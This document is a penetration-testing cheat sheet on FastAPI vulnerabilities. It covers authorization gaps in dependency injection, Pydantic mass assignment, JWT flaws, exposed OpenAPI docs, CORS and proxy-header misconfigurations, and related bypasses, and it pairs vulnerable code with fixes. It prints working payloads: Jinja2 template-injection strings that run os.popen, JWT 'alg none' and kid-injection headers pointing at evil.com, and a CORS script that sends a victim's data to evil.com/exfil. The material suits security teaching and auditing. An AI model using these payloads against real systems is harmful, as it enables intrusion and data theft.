# FastAPI Security

*Python async framework vulnerabilities: dependency injection, JWT handling, Pydantic validation, and OpenAPI exposure*

---

## TL;DR

FastAPI = Starlette + Pydantic. Attack surfaces: dependency injection gaps, JWT misconfigurations, Pydantic validation bypasses, exposed OpenAPI documentation, and middleware misconfigurations.

**Key Issues:**
- `Depends()` vs `Security()` — Dependency injection ≠ authorization
- Pydantic `extra="allow"` enables mass assignment
- `/docs` and `/openapi.json` expose full API schema in production
- Template injection if Jinja2 used with user input
- Proxy header trust without network boundaries

---

## How It Works

### FastAPI Security Model

FastAPI handles security through:

1. **Dependency Injection** — `Depends()` for data, `Security()` for authorization
2. **Pydantic Models** — Input validation and serialization
3. **OAuth2/JWT Utilities** — Helper classes for token handling
4. **Middleware** — CORS, sessions, proxy headers
5. **OpenAPI Schema** — Auto-generated documentation

**The Gap:** Developers often assume `Depends()` enforces authorization, when it's just dependency resolution.

---

## Detection

### Fingerprinting FastAPI

```bash
# Response headers
Server: uvicorn
Content-Type: application/json

# Error format
{"detail": "Not Found"}
{"detail": [{"loc": ["body", "email"], "msg": "field required"}]}

# Default endpoints
GET /docs           → Swagger UI
GET /redoc          → ReDoc
GET /openapi.json   → Full schema
```

### Version Detection

```python
# Look for uvicorn/starlette in headers or error traces
# Check OpenAPI schema version field
```

---

## Exploitation

### 1. Dependency Injection Authorization Gap

**Vulnerable Pattern:**
```python
from fastapi import Depends

# WRONG: Depends() just injects the user, no authz check
@app.get("/admin")
async def admin_panel(user: User = Depends(get_current_user)):
    return {"admin": True}
```

**Correct Pattern:**
```python
from fastapi import Security

# CORRECT: Security() checks scopes
@app.get("/admin")
async def admin_panel(
    user: User = Security(get_current_user, scopes=["admin"])
):
    return {"admin": True}
```

**Attack:**
```bash
# Any authenticated user can access "admin" endpoint
curl -H "Authorization: Bearer ANY_VALID_TOKEN" \
  https://target.com/admin
```

**Look for:**
- Routes with `Depends(get_current_user)` but no role/scope checks
- Endpoints assuming token presence = authorization
- Missing `Security()` wrapper with scopes

---

### 2. Pydantic Mass Assignment

**Vulnerable Pattern:**
```python
class UserUpdate(BaseModel):
    name: str
    
    class Config:
        extra = "allow"  # DANGER: Accepts any extra field
```

**Attack:**
```bash
PUT /users/me
Content-Type: application/json

{
  "name": "legit",
  "role": "admin",
  "is_verified": true,
  "credits": 999999
}
```

**Impact:** Privilege escalation, balance manipulation, bypassing verification

**Detection:**
```python
# Search codebase for:
extra = "allow"
extra = Extra.allow
```

---

### 3. JWT Implementation Flaws

**Common Mistakes:**
```python
# 1. Algorithm not pinned
jwt.decode(token, SECRET, algorithms=["HS256", "RS256"])  # Confusion attack

# 2. No audience/issuer validation
jwt.decode(token, SECRET, algorithms=["HS256"])  # Missing aud/iss checks

# 3. 'kid' header injection
# If key fetched from kid without validation → SSRF or key confusion

# 4. Expiration not enforced
jwt.decode(token, SECRET, options={"verify_exp": False})
```

**Attack Payloads:**
```json
# Algorithm confusion (if RS256/HS256 both accepted)
{
  "alg": "HS256",
  "typ": "JWT"
}
# Sign with public key as HMAC secret

# None algorithm
{
  "alg": "none",
  "typ": "JWT"
}

# kid header injection
{
  "alg": "HS256",
  "kid": "http://evil.com/key"
}
```

---

### 4. Template Injection (Jinja2)

If FastAPI app uses Jinja2 templates with user input:

```python
# Vulnerable
@app.get("/hello/{name}")
async def hello(name: str):
    template = f"<h1>Hello {name}</h1>"  # SSTI
    return HTMLResponse(template)
```

**Payloads:**
```python
{{ cycler.__init__.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

### 5. OpenAPI Exposure in Production

**Risk:** Full API schema accessible to attackers

```bash
# Download complete API documentation
curl https://target.com/openapi.json > schema.json

# Extract:
# - All endpoints (including undocumented)
# - Parameter names and types
# - Authentication schemes
# - Internal models
```

**Should be disabled:**
```python
# Production config
app = FastAPI(
    docs_url=None,      # Disable /docs
    redoc_url=None,     # Disable /redoc
    openapi_url=None    # Disable /openapi.json
)
```

---

### 6. CORS Misconfiguration

**Vulnerable:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,  # DANGER with allow_origins=*
)
```

**Attack:**
```html
<!-- evil.com -->
<script>
fetch('https://target.com/api/user', {
  credentials: 'include'  // Sends cookies
}).then(r => r.json()).then(data => {
  fetch('https://evil.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

---

### 7. Proxy Headers Trust

**Vulnerable:**
```python
app.add_middleware(
    ProxyHeadersMiddleware,
    trusted_hosts=["*"]  # Trusts all X-Forwarded-* headers
)
```

**Attack:**
```bash
# Spoof client IP for rate limit bypass
curl -H "X-Forwarded-For: 127.0.0.1" \
  https://target.com/api/login
```

---

## Bypasses

### Content-Type Switching

Different validators may apply per Content-Type:

```bash
# JSON validator might be strict
POST /api/users
Content-Type: application/json
{"role": "admin"}  # Blocked

# Form data might bypass
POST /api/users
Content-Type: application/x-www-form-urlencoded
role=admin  # Allowed?
```

### Type Coercion

```python
# Edge cases
{"count": ""}      # Empty string → None
{"active": ""}     # Might become False or None
{"id": "1"}        # String instead of int
{"price": "1e999"} # Scientific notation overflow
```

### Mounted Sub-Apps

```python
# Global middleware may not apply to mounted apps
app.mount("/admin", admin_app)
app.mount("/static", StaticFiles(directory="static"))

# Test: /admin/* might bypass auth middleware
```

### WebSocket Authorization

```python
# Common mistake: auth at handshake only
@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket,
    user: User = Depends(get_current_user)
):
    await websocket.accept()
    while True:
        data = await websocket.receive_json()
        # No re-validation per message!
```

**Attack:** Connect to victim's WebSocket channel

---

### Background Tasks IDOR

```python
@app.post("/process")
async def process(
    doc_id: int,
    background_tasks: BackgroundTasks,
    user: User = Depends(get_current_user)
):
    # Check authz HERE
    if not user.can_access(doc_id):
        raise HTTPException(403)
    
    # But background task might not re-check
    background_tasks.add_task(process_document, doc_id)
```

**Attack:** Race condition or parameter manipulation before task executes

---

## Pro Tips

1. **Fuzz hidden routes** — Search for `include_in_schema=False` in source/errors
2. **Router dependencies matter** — Check if router-level dependencies match route-level
3. **Mounted sub-apps** — Test if global middleware applies
4. **Type coercion** — Empty strings, None, unions can bypass validation
5. **WebSocket authz** — Should be per-message, not just handshake
6. **Background tasks** — Re-validate permissions at execution time

---

## Validation

Prove vulnerabilities with:

1. ✅ Access `/docs`, `/redoc`, `/openapi.json` in production
2. ✅ Demonstrate mass assignment via `extra="allow"`
3. ✅ Show `Depends()` route accessible without proper authorization
4. ✅ CORS misconfiguration allows credential theft from evil origin
5. ✅ Type coercion bypasses Pydantic validation

---

## References

- [FastAPI Security Documentation](https://fastapi.tiangolo.com/tutorial/security/)
- [Starlette Security](https://www.starlette.io/authentication/)
- [Pydantic Field Validation](https://docs.pydantic.dev/latest/usage/models/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- OWASP API Security Top 10
